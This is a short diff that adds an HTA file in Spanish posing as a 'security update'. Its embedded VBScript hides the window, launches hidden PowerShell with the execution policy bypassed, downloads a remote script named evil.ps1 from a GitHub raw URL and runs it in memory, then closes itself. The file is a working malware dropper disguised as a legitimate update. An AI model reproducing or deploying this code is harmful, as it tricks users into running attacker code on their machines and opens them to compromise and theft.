@@ -1,0 +1,21 @@
+<html>
+<head>
+<title>Actualización de seguridad</title>
+<HTA:APPLICATION ID="objUpdate" APPLICATIONNAME="ActualizacionSeguridad" WINDOWSTATE="minimize" SHOWINTASKBAR="no" />
+<script language="VBScript">
+    ' Ocultar la ventana
+    Self.ResizeTo 0, 0
+    Self.MoveTo -100, -100
+    
+    ' Ejecutar PowerShell en segundo plano
+    Dim shell
+    Set shell = CreateObject("WScript.Shell")
+    shell.Run "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command ""IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/jesusb26/ScriptPDF/refs/heads/main/evil.ps1')""", 0, False
+    
+    ' Cerrar la ventana automáticamente
+    Self.Close()
+</script>
+</head>
+<body>
+</body>
+</html>
